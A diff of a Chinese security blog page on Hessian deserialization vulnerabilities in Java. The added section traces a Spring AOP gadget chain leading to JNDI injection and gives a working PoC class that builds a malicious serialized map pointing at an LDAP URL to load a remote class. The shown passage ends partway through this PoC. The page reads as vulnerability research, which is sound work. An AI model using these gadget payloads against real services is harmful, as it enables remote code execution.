@@ -9,7 +9,7 @@
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#序列化>序列化</a></li><li><a href=#反序列化>反序列化</a><ol><li><a href=#hessian>hessian</a></li><li><a href=#hessian2>hessian2</a></li><li><a href=#mapdeserializer>MapDeserializer</a></li></ol></li><li><a href=#gadget>gadget</a><ol><li><a href=#romejdbcrowsetimpl>Rome&ndash;JdbcRowSetImpl</a></li><li><a href=#resinqname>Resin&ndash;Qname</a></li><li><a href=#templatesimpl--signedobject>TemplatesImpl && SignedObject</a></li><li><a href=#xbean>XBean</a></li><li><a href=#spring-aop>Spring AOP</a></li><li><a href=#spring-context--aop>Spring Context & AOP</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/javasec/>Javasec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/hessian-deserialization/>Hessian反序列化</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
 <time class=article-time--published datetime=2025-11-18T01:00:59+08:00>Nov 18, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>16 minute read</time></div></footer></div></header><section class=article-content><h2 id=序列化>序列化</h2><p>HessianOutput 和 Hessian2Output 都是抽象类 AbstractHessianOutput 的实现，二者的 writeObject 方法一致，根据传入的 object 的类型，获取对应需要的序列化器，调用序列化器的 writeObject 方法序列化数据。代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<time class=article-time--reading>22 minute read</time></div></footer></div></header><section class=article-content><h2 id=序列化>序列化</h2><p>HessianOutput 和 Hessian2Output 都是抽象类 AbstractHessianOutput 的实现，二者的 writeObject 方法一致，根据传入的 object 的类型，获取对应需要的序列化器，调用序列化器的 writeObject 方法序列化数据。代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -1613,9 +1613,791 @@
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>putVal</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>634</span><span class=p>)</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>611</span><span class=p>)</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>gadget</span><span class=p>.</span><span class=na>XBeanPoc</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>XBeanPoc</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>34</span><span class=p>)</span><span class=w>
-</span></span></span></code></pre></td></tr></table></div></div><h3 id=spring-aop>Spring AOP</h3><h3 id=spring-context--aop>Spring Context & AOP</h3><blockquote><p><a class=link href=https://xz.aliyun.com/news/17603 target=_blank rel=noopener>https://xz.aliyun.com/news/17603</a></p><p><a class=link href=https://www.javasec.org/java-vuls/Hessian.html target=_blank rel=noopener>https://www.javasec.org/java-vuls/Hessian.html</a></p><p><a class=link href=https://changeyourway.github.io/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ target=_blank rel=noopener>https://changeyourway.github.io/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a class=link href=https://goodapple.top/archives/1193 target=_blank rel=noopener>https://goodapple.top/archives/1193</a></p></blockquote></section><footer class=article-footer><section class=article-tags></section><section class=article-references><div class=article-references__header><span class=article-references__icon><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=spring-aop>Spring AOP</h3><p>学习 XBean Gadget 知道<code>HotSwappableTargetSource#equals</code>可以触发任意方法的 equals 方法，而在这条链子中就是<code>AbstractPointcutAdvisor#equals</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>equals</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>other</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>other</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>other</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>PointcutAdvisor</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PointcutAdvisor</span><span class=w> </span><span class=n>otherAdvisor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>PointcutAdvisor</span><span class=p>)</span><span class=n>other</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ObjectUtils</span><span class=p>.</span><span class=na>nullSafeEquals</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>getAdvice</span><span class=p>(),</span><span class=w> </span><span class=n>otherAdvisor</span><span class=p>.</span><span class=na>getAdvice</span><span class=p>())</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>ObjectUtils</span><span class=p>.</span><span class=na>nullSafeEquals</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>getPointcut</span><span class=p>(),</span><span class=w> </span><span class=n>otherAdvisor</span><span class=p>.</span><span class=na>getPointcut</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>使用 <code>ObjectUtils.nullSafeEquals</code> 方法比较当前对象与 <code>otherAdvisor</code> 的 <code>advice</code> 和 <code>pointcut</code> 属性，然后触发 getAdvice 和 getPointcut 方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>nullSafeEquals</span><span class=p>(</span><span class=nd>@Nullable</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>o1</span><span class=p>,</span><span class=w> </span><span class=nd>@Nullable</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>o2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>o1</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>o2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>o1</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>o2</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>o1</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>o2</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>o1</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>isArray</span><span class=p>()</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>o2</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>isArray</span><span class=p>()</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>arrayEquals</span><span class=p>(</span><span class=n>o1</span><span class=p>,</span><span class=w> </span><span class=n>o2</span><span class=p>)</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>要满足两个 AbstractPointcutAdvisor 对象相等，就是在对比其 Pointcut 切点和 Advice 是否为同一个。现在需要在 AbstractPointcutAdvisor 子类中寻找可用的 getAdvice\getPointcut 方法，发现<code>AbstractBeanFactoryPointcutAdvisor#getAdvice</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>Advice</span><span class=w> </span><span class=nf>getAdvice</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Advice</span><span class=w> </span><span class=n>advice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>advice</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Assert</span><span class=p>.</span><span class=na>state</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>adviceBeanName</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#39;adviceBeanName&#39; must be specified&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Assert</span><span class=p>.</span><span class=na>state</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=s>&#34;BeanFactory must be set to resolve &#39;adviceBeanName&#39;&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=p>.</span><span class=na>isSingleton</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>adviceBeanName</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>advice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Advice</span><span class=p>)</span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>adviceBeanName</span><span class=p>,</span><span class=w> </span><span class=n>Advice</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>advice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>synchronized</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>adviceMonitor</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>advice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>advice</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>advice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Advice</span><span class=p>)</span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>adviceBeanName</span><span class=p>,</span><span class=w> </span><span class=n>Advice</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>this</span><span class=p>.</span><span class=na>advice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=n>advice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>会触发到 getBean 方法，<code>SimpleJndiBeanFactory#getBean</code>可以触发 lookup 方法，可以打JNDI注入</p><p><img src=/p/hessian-deserialization/15.png width=1572 height=632 loading=lazy alt=img></p><p><img src=/p/hessian-deserialization/16.png width=1496 height=722 loading=lazy alt=img></p><p>AbstractBeanFactoryPointcutAdvisor 是一个抽象类，不能直接实例化。使用它的具体实现类 DefaultBeanFactoryPointcutAdvisor，AbstractPointcutAdvisor也是一个抽象类，其实现类为AsyncAnnotationAdvisor，最终 poc 如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.hessian.gadget</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.target.HotSwappableTargetSource</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.scheduling.annotation.AsyncAnnotationAdvisor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>springAopExp</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ldap://127.0.0.1:1389/#Eval&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SimpleJndiBeanFactory</span><span class=w> </span><span class=n>beanFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SimpleJndiBeanFactory</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>beanFactory</span><span class=p>.</span><span class=na>setShareableResources</span><span class=p>(</span><span class=n>url</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>DefaultBeanFactoryPointcutAdvisor</span><span class=w> </span><span class=n>advisor1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>DefaultBeanFactoryPointcutAdvisor</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>advisor1</span><span class=p>.</span><span class=na>setAdviceBeanName</span><span class=p>(</span><span class=n>url</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>advisor1</span><span class=p>.</span><span class=na>setBeanFactory</span><span class=p>(</span><span class=n>beanFactory</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AsyncAnnotationAdvisor</span><span class=w> </span><span class=n>advisor2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>AsyncAnnotationAdvisor</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=s>&#34;1&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=s>&#34;2&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>innerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>innerMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource1</span><span class=p>,</span><span class=w> </span><span class=s>&#34;aaa&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>innerMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource2</span><span class=p>,</span><span class=w> </span><span class=s>&#34;bbb&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>targetSource1</span><span class=p>,</span><span class=w> </span><span class=s>&#34;target&#34;</span><span class=p>,</span><span class=w> </span><span class=n>advisor1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>targetSource2</span><span class=p>,</span><span class=w> </span><span class=s>&#34;target&#34;</span><span class=p>,</span><span class=w> </span><span class=n>advisor2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>outerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outerMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>innerMap</span><span class=p>,</span><span class=w> </span><span class=s>&#34;ccc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=o>=</span><span class=n>serialize</span><span class=p>(</span><span class=n>outerMap</span><span class=p>);</span><span class=w>
